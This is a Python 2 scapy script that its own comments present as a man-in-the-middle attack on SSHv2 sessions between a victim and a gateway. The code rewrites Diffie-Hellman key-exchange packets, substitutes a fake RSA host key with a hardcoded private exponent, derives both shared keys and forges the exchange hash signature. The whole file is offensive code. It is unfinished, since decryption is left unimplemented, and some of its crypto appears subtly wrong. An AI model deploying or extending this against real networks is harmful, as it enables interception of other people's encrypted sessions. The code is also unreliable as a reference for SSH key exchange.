from scapy.all import *
import sys, os, time, binascii, hashlib
from Crypto.PublicKey import RSA
from Crypto.Random import get_random_bytes
from Crypto.Cipher import AES, PKCS1_OAEP

KEX_INIT = 20
DH_GEX_REQ = 34
DH_GEX_GROUP = 31
DH_GEX_INIT = 32
DH_GEX_REPLY = 33
NEW_KEYS = 21

# Pretender
# ===========
# This class creates fake client and server to conduct MITM attack on SSHv2

class Pretender:

	def __init__ (self, victim_mac, gateway_mac):

		self.fake_client = {
			"src": victim_mac,
			"V_C": None, # client identification string
			"seq": None,
			"ack": None,
			"plen": None, # payload_len
			"expected_ack": None, # expected ack number
			"V_C": None, # client ssh version
			"I_C": None, # kex init payload
			"min": None, # min size in bits for group (p, g)
			"n": None, # preferred size in bits for group (p, g)
			"max": None, # max size in bits for group (p, g)
			"secret_key": 3773,
			"shared_key": None
		}

		self.fake_server = {
			"src": gateway_mac,
			"V_S": None, # server identification string
			"seq": None,
			"ack": None,
			"plen": None, # payload_len
			"expected_ack": None, # expected ack number
			"V_S": None, # server ssh version
			"I_S": None, # kex init payload
			"secret_key": 199,
			"shared_key": None,
			"rsa_key": { # host key
				"e": 17,
				# "d": 1568560811924611620106661755841468201717266394322268318493735523557050947635521634054955259339742269231556293406475766851897996062431769825767853143824929966759858765700214857764311433090038033144845961217006964801861386480535545362681406650697069715408566074125040809141061726147938528584071292888869029407534694760047538661262148496439488258430130059697770770893870812353110668027652660354970935553815086333119458148628076519005675402655104323726416001367554618380026165917491156534788119170894578997653370461894320526613513878872419509503539350843411737469252367486159616684412148864388410200614039197149961327457,
				"d": 1917515135367345400484927620575830924904827234684447746906009834879106611441209482132462193292082107345220864283809183113873695516068149205396394809881493752633731141289171750411244806986990145619144979060262942746428260884037548093199893087949454593266874174734122236074649563221308921149196716463614384486531422435700866835077405949354359823145953972696389461067901342615366643331148042304690539797327445027766663746503685679794622607853962932232867586419178898892775443939324521833316133454921169545886165765858682314549777590392566220743791903516072723804741920273267551565706228912783304138150139677169607521969,
				# "n": 23702696713527464481611777643826630603727581069758721257238670133750992097603438025719323918911660957276850655920078254650903051610080077367158669728910052831037865792803246739549594988916130278633227858390327468117016506816981574369407922721644609032840554009000616671464932750679959987492632870320687555491944107804209665062682235326172904265712696651613697808566180637187870437952158871006266578407390174661746872919818056787008007653132480912706351863850469608163111923270554588022880288337327962610044065388551056507591398945990958099911416158226155464950971930600769984333532821303973774429764427891704713733977
				"n": 24448317975933653856182827162341844292536547242226708773051625394708609295875420897188892964474046868651566019618567084701889617829868902368804033825989045346080072051436939817743371289084124356644098483018352520016960326271478738188298636871355546064152645727860058509951781931071688744652258134911083402203589868183363386775682192701388299050649384742480712158859455946219371149659684447471742721300104711066905040993066706768444884896828627528442175944108191116076709090278237954714258863821771927347395362785470991287347379023658305945632017877365654951331444291631494401135600518422903761972119079527803741709459
			},
			"certificate": None
		}

		# DH
		self.p = None
		self.g = None
		self.e = None
		self.f = None
		# Algorithms
		self.rsa = None
		self.hash = None
		self.aes = None
		# Post key-exchange
		self.KEYS_SET = False
	#enddef

	def process (self, packet):
		# Make sure TCP sequence and ack numbers are correct
		if packet.haslayer(TCP):
			if packet[Ether].src == self.fake_client["src"]:
				# packet from client
				# initialization
				if self.fake_client["seq"] == None and packet[TCP].seq != 0:
					self.fake_client["seq"] = packet[TCP].seq
					self.fake_client["expected_ack"] = self.fake_client["seq"] + 1
					return
				#endif
				self.fake_client["seq"] = packet[TCP].seq
				self.fake_client["ack"] = packet[TCP].ack
				self.fake_client["plen"] = 0
				if packet.haslayer(Raw):
					self.fake_client["plen"] = len(packet[Raw].load)
					if packet[TCP].dport == 22 or packet[TCP].sport == 22:
						old_raw = packet[Raw].load
						old_len = len(packet[Raw].load)
						new_payload = self.parseSSH(packet[Raw].load,True) # True: from client
						diff_len = old_len - len(new_payload)
						if diff_len != 0:
							print "\nClient"
							print "==== wrong packet length ==="
							print "old - " + str(len(old_raw))
							print old_raw
							print "new - " + str(len(new_payload))
							print new_payload + "\n\n"
						#endif
						packet[Raw].load = new_payload
						packet[IP].len = packet[IP].len - diff_len
						del packet[TCP].chksum
						del packet[IP].chksum
					#endif
				#endif
				# # expected ack
				# assigned_ack = ""
				# self.fake_client["expected_ack"] = self.fake_client["seq"] + self.fake_client["plen"]
				# if self.fake_server["expected_ack"] != None and self.fake_server["expected_ack"] != self.fake_client["ack"]:
				# 	packet[TCP].ack = self.fake_server["expected_ack"]
				# 	assigned_ack = " >> " + str(self.fake_server["expected_ack"])
				# #endif
				# # expected seq from client to server
				# assigned_seq = ""
				# if self.fake_server["ack"] != None and self.fake_client["seq"] != self.fake_server["ack"]:
				# 	packet[TCP].seq = self.fake_server["ack"]
				# 	assigned_seq = " >> " + str(self.fake_server["ack"])
				# #endif
				# print "From client:"
				# print "SEQ: " + str(self.fake_client["seq"]) + assigned_seq
				# print "ACK: " + str(self.fake_client["ack"]) + assigned_ack
				# print "LEN: " + str(self.fake_client["plen"])
				# print "ECK: " + str(self.fake_client["expected_ack"])
				# print " "
			elif packet[Ether].src == self.fake_server["src"]:
				# packet from server
				# initialization
				if self.fake_server["seq"] == None and packet[TCP].seq != 0:
					self.fake_server["seq"] = packet[TCP].seq
					self.fake_server["expected_ack"] = self.fake_server["seq"] + 1
					return
				#endif
				self.fake_server["seq"] = packet[TCP].seq
				self.fake_server["ack"] = packet[TCP].ack
				self.fake_server["plen"] = 0
				if packet.haslayer(Raw):
					self.fake_server["plen"] = len(packet[Raw].load)
					if packet[TCP].dport == 22 or packet[TCP].sport == 22:
						old_raw = packet[Raw].load
						old_len = len(packet[Raw].load)
						new_payload = self.parseSSH(packet[Raw].load,False) # False: from server
						diff_len = old_len - len(new_payload)
						if diff_len != 0:
							print "\nServer"
							print "==== wrong packet length ==="
							print "old - " + str(len(old_raw))
							print old_raw
							print "new - " + str(len(new_payload))
							print new_payload + "\n\n"
						#endif
						packet[Raw].load = new_payload
						print "\n" + binascii.hexlify(new_payload)
						packet[IP].len = packet[IP].len - diff_len
						del packet[TCP].chksum
						del packet[IP].chksum
					#endif
				#endif
				# # expected ack
				# assigned_ack = ""
				# self.fake_server["expected_ack"] = self.fake_server["seq"] + self.fake_server["plen"]
				# if self.fake_client["expected_ack"] != None and self.fake_client["expected_ack"] != self.fake_server["ack"]:
				# 	packet[TCP].ack = self.fake_client["expected_ack"]
				# 	assigned_ack = " >> " + str(self.fake_client["expected_ack"])
				# #endif
				# # expected seq from server to client
				# assigned_seq = ""
				# if self.fake_client["ack"] != None and self.fake_server["seq"] != self.fake_client["ack"]:
				# 	packet[TCP].seq = self.fake_client["ack"]
				# 	assigned_seq = " >> " + str(self.fake_client["ack"])
				# #endif
				# print "From server:"
				# print "SEQ: " + str(self.fake_server["seq"]) + assigned_seq
				# print "ACK: " + str(self.fake_server["ack"]) + assigned_ack
				# print "LEN: " + str(self.fake_server["plen"])
				# print "ECK: " + str(self.fake_server["expected_ack"])
				# print " "
			#endif
		#endif
	#enddef

	def parseSSH (self, raw, from_client):
		if self.KEYS_SET == True:
			payload = raw
			if from_client:
				# Decrypt first packet
				print "[*] Key Exchanged Sucessfully"
				print "[*] Decryption needs implementation"
				print "[*] Goodbye!"
				sys.exit(1)
			#endif
			return payload
		#endif

		payload = SSH(raw)
		if payload.err:
			return
		#endif
		if payload.SSH_VEX == True:
			print "\nSSH_VEX"
			if from_client:
				self.fake_client["V_C"] = payload.v.strip()
			else:
				self.fake_server["V_S"] = payload.v.strip()
			#endif
		elif payload.SSH_MSG_KEXINIT == KEX_INIT:
			print "\nKEX_INIT"
			if from_client:
				self.fake_client["I_C"] = raw
			else:
				self.fake_server["I_S"] = raw
			#endif
		elif payload.SSH_MSG_KEXINIT == DH_GEX_REQ:
			print "\nDH_GEX_REQ"
			if from_client:
				self.fake_client["max"] = int(binascii.hexlify(payload.max),16)
				self.fake_client["n"] = int(binascii.hexlify(payload.n),16)
				self.fake_client["min"] = int(binascii.hexlify(payload.min),16)
			else:
				return
			#endif
		elif payload.SSH_MSG_KEXINIT == DH_GEX_GROUP:
			print "\nDH_GEX_GROUP"
			if from_client:
				return
			else:
				# P and G
				self.p = int(binascii.hexlify(payload.modulus),16)
				self.g = int(binascii.hexlify(payload.base),16)
			#endif
		elif payload.SSH_MSG_KEXINIT == DH_GEX_INIT:
			print "\nDH_GEX_INIT"
			if from_client:
				# E
				self.e = int(binascii.hexlify(payload.e),16)
				e_len = len(payload.e)
				fake_e  = (self.g**self.fake_client["secret_key"]) % self.p
				payload.e = int_to_hex(fake_e, e_len)
			else:
				return
			#endif
		elif payload.SSH_MSG_KEXINIT == DH_GEX_REPLY:
			print "\nDH_GEX_REPLY"
			if from_client:
				return
			else:
				print "running - server"
				# Host key
				host_len = len(payload.host_key)
				fake_host_key = \
				int_to_hex(len(payload.rsa["alg"]),4) + payload.rsa["alg"] + \
				int_to_hex(len(payload.rsa["e"]),4) + int_to_hex(self.fake_server["rsa_key"]["e"],len(payload.rsa["e"])) + \
				int_to_hex(len(payload.rsa["n"]),4) + int_to_hex(self.fake_server["rsa_key"]["n"],len(payload.rsa["n"]))
				payload.host_key = fake_host_key
				# F
				self.f = int(binascii.hexlify(payload.f),16)
				f_len = len(payload.f)
				fake_f = (self.g**self.fake_server["secret_key"]) % self.p
				payload.f = int_to_hex(fake_f, f_len)
				# Shared key
				self.fake_server["shared_key"] = (self.e**self.fake_server["secret_key"]) % self.p
				self.fake_client["shared_key"] = (self.f**self.fake_client["secret_key"]) % self.p
				# Signature
				h_string = \
				self.fake_client["V_C"] + \
				self.fake_server["V_S"] + \
				self.fake_client["I_C"] + \
				self.fake_server["I_S"] + \
				fake_host_key + \
				int_to_hex(self.fake_client["min"],4) + \
				int_to_hex(self.fake_client["n"],4) + \
				int_to_hex(self.fake_client["max"],4) + \
				int_to_hex(self.p,1) + \
				int_to_hex(self.g,1) + \
				int_to_hex(self.e,1) + \
				int_to_hex(fake_f,1) + \
				int_to_hex(self.fake_server["shared_key"],1)
					# Hashed - SHA256
				m = hashlib.sha256()
				m.update(h_string)
				digest = m.digest()
					# Signed - RSA
				key = RSA.construct((self.fake_server["rsa_key"]["n"],self.fake_server["rsa_key"]["e"],self.fake_server["rsa_key"]["d"]))
				cipher_rsa = PKCS1_OAEP.new(key)
				signed = cipher_rsa.encrypt(digest)
				fake_sig = int_to_hex(len(payload.sig["alg"]),4) + payload.sig["alg"] + \
				int_to_hex(len(signed),4) + signed
				payload.signature = fake_sig
				print "finished"
			#endif
		elif payload.SSH_MSG_KEXINIT == NEW_KEYS:
			print "\nNEW_KEYS"
			if from_client:
				self.KEYS_SET = True
			else:
				return
			#endif
		#endif

		new_payload = payload.reconstruct()
		return new_payload
	#enddef

#endclass

# SSH
# =====
# This class parses SSH payload

class SSH:

	def __init__ (self, payload):

		self.err = False
		self.SSH_VEX = False
		if payload[0:3] == "SSH":
			# This is SSH version exchange
			self.SSH_VEX = True
			self.v = payload
			return
		#endif
		if len(payload) % 2 != 0 or len(payload) < 6:
			print "\nPayload length error: " + str(len(payload))
			self.err = True
			return
		#endif

		self.packet_len = int(binascii.hexlify(payload[0:4]), 16)
		self.padding_len = int(binascii.hexlify(payload[4:5]), 16)
		self.SSH_MSG_KEXINIT = ord(payload[5:6])

		if self.SSH_MSG_KEXINIT == KEX_INIT:
			# Algorithm negotiation
			# Cookie
			self.cookie = payload[6:22]
			# Key exchange algorithms
			kex_algorithms_len = int(binascii.hexlify(payload[22:26]), 16)
			self.kex_algorithms = payload[26:26+kex_algorithms_len]
			rest = payload[26+kex_algorithms_len:]
			# Host key algorithms
			pub_key_algorithms_len = int(binascii.hexlify(rest[0:4]), 16)
			self.pub_key_algorithms = rest[4:4+pub_key_algorithms_len]
			rest = rest[4+pub_key_algorithms_len:]
			# Symmetric key algorithms
				# client to host (ch)
			sym_key_algorithms_ch_len = int(binascii.hexlify(rest[0:4]), 16)
			self.sym_key_algorithms_ch = rest[4:4+sym_key_algorithms_ch_len]
			rest = rest[4+sym_key_algorithms_ch_len:]
				# host to client (hc)
			sym_key_algorithms_hc_len = int(binascii.hexlify(rest[0:4]), 16)
			self.sym_key_algorithms_hc = rest[4:4+sym_key_algorithms_hc_len]
			rest = rest[4+sym_key_algorithms_hc_len:]
			# MAC algorithms
				# client to host (ch)
			mac_algorithms_ch_len = int(binascii.hexlify(rest[0:4]), 16)
			self.mac_algorithms_ch = rest[4:4+mac_algorithms_ch_len]
			rest = rest[4+mac_algorithms_ch_len:]
				# host to client (hc)
			mac_algorithms_hc_len = int(binascii.hexlify(rest[0:4]), 16)
			self.mac_algorithms_hc = rest[4:4+mac_algorithms_hc_len]
			rest = rest[4+mac_algorithms_hc_len:]
			# rest
			self.rest = rest[0:-self.padding_len]
		elif self.SSH_MSG_KEXINIT == DH_GEX_REQ:
			# Client specifies min, max bits requirement for P
			# Min
			self.min = payload[6:10]
			rest = payload[10:]
			# N
			self.n = rest[0:4]
			rest = rest[4:]
			# Max
			self.max = rest[0:4]
			rest = rest[4:]
			# rest
			self.rest = rest[0:-self.padding_len]
		elif self.SSH_MSG_KEXINIT == DH_GEX_GROUP:
			# Server sends P and G
			# P
			p_len = int(binascii.hexlify(payload[6:10]),16)
			self.modulus = payload[10:10+p_len]
			rest = payload[10+p_len:]
			# G
			g_len = int(binascii.hexlify(rest[0:4]),16)
			self.base = rest[4:4+g_len]
			rest = rest[4+g_len:]
			# rest
			self.rest = rest[0:-self.padding_len]
		elif self.SSH_MSG_KEXINIT == DH_GEX_INIT:
			# Client sends E
			# E
			e_len = int(binascii.hexlify(payload[6:10]),16)
			self.e = payload[10:10+e_len]
			rest = payload[10+e_len:]
			# rest
			self.rest = rest[0:-self.padding_len]
		elif self.SSH_MSG_KEXINIT == DH_GEX_REPLY:
			# NOTE: Server sends REPLY and NEW KEYS at the same time!
			self.newkey_load = payload[4+self.packet_len:]
			payload = payload[0:4+self.packet_len]
			# Server replies with host key, f, signature
			# Host key
			host_len = int(binascii.hexlify(payload[6:10]),16)
			self.host_key = payload[10:10+host_len]
			rest = payload[10+host_len:]
				# RSA
			self.rsa = {}
			alg_len = int(binascii.hexlify(self.host_key[0:4]),16)
			self.rsa["alg"] = self.host_key[4:4+alg_len]
			rsa_e_len = int(binascii.hexlify(self.host_key[4+alg_len:8+alg_len]),16)
			self.rsa["e"] = self.host_key[8+alg_len:8+alg_len+rsa_e_len]
			rsa_n_len = int(binascii.hexlify(self.host_key[8+alg_len+rsa_e_len:12+alg_len+rsa_e_len]),16)
			self.rsa["n"] = self.host_key[12+alg_len+rsa_e_len:12+alg_len+rsa_e_len+rsa_n_len]
			# F
			f_len = int(binascii.hexlify(rest[0:4]),16)
			self.f = rest[4:4+f_len]
			rest = rest[4+f_len:]
			# Signature
			sig_len = int(binascii.hexlify(rest[0:4]),16)
			self.signature = rest[4:4+sig_len]
			rest = rest[4+sig_len:]
				# Alg
			self.sig = {}
			sig_alg_len = int(binascii.hexlify(self.signature[0:4]),16)
			self.sig["alg"] = self.signature[4:4+sig_alg_len]
			# rest
			self.rest = rest[0:-self.padding_len]
		elif self.SSH_MSG_KEXINIT == NEW_KEYS:
			# rest
			self.rest = payload[6:-self.padding_len]
		#endif
	#enddef

	def reconstruct (self):
		if self.SSH_VEX == True:
			return self.v
		#enddef

		# SSH_MSG_KEXINIT must exist
		payload = chr(self.SSH_MSG_KEXINIT)
		# Codes
		if self.SSH_MSG_KEXINIT == KEX_INIT:
			# Cookie
			payload = payload + self.cookie
			# Key exchange
			payload = payload + int_to_hex(len(self.kex_algorithms),4) + self.kex_algorithms
			# Host key
			payload = payload + int_to_hex(len(self.pub_key_algorithms),4) + self.pub_key_algorithms
			# Symmetric key
			payload = payload + int_to_hex(len(self.sym_key_algorithms_ch),4) + self.sym_key_algorithms_ch
			payload = payload + int_to_hex(len(self.sym_key_algorithms_hc),4) + self.sym_key_algorithms_hc
			# MAC
			payload = payload + int_to_hex(len(self.mac_algorithms_ch),4) + self.mac_algorithms_ch
			payload = payload + int_to_hex(len(self.mac_algorithms_hc),4) + self.mac_algorithms_hc
		elif self.SSH_MSG_KEXINIT == DH_GEX_REQ:
			# Max
			payload = payload + self.min
			# N
			payload = payload + self.n
			# Min
			payload = payload + self.max
		elif self.SSH_MSG_KEXINIT == DH_GEX_GROUP:
			# P
			payload = payload + int_to_hex(len(self.modulus),4) + self.modulus
			# G
			payload = payload + int_to_hex(len(self.base),4) + self.base
		elif self.SSH_MSG_KEXINIT == DH_GEX_INIT:
			# E
			payload = payload + int_to_hex(len(self.e),4) + self.e
		elif self.SSH_MSG_KEXINIT == DH_GEX_REPLY:
			# Host key
			payload = payload + int_to_hex(len(self.host_key),4) + self.host_key
			# F
			payload = payload + int_to_hex(len(self.f),4) + self.f
			# Signature
			payload = payload + int_to_hex(len(self.signature),4) + self.signature
			print "sending"
		elif self.SSH_MSG_KEXINIT == NEW_KEYS:
			# Do nothing
			pass
		#endif

		# rest
		payload = payload + self.rest
		# Padding
		padding_len = get_padlen(len(payload))
		# Packet len
		packet_len = 1 + len(payload) + padding_len
		packet = int_to_hex(packet_len,4) + int_to_hex(padding_len,1) + payload + chr(0) * padding_len
		# If packet is DH_GEX_REPLY, append it with NEW_KEYS
		if self.SSH_MSG_KEXINIT == DH_GEX_REPLY:
			packet = packet + self.newkey_load
		#endif
		return packet
	#enddef

#endclass

#
# Utilities
#
def replace_payload (old, new):
	# This is stupid!
	old_len = len(old)
	return new + "x" * (old_len - len(new))
#enddef

def to_hex (ch):
	return "{0:02x}".format(ord(ch))
#enddef

def int_to_hex (i, num_of_bytes):
	# Turn an integer into binary data with a speicifed number of bytes
	s = "{0:0{1}x}".format(i,num_of_bytes*2)
	if len(s) % 2 != 0:
		s = "0" + s
	#endif
	return binascii.unhexlify(s)
#enddef

def get_padlen (payload_len):
	for x in range(4,256):
		if (4 + 1 + payload_len + x) % 8 == 0:
			return x
		#endif
	#endfor
#enddef
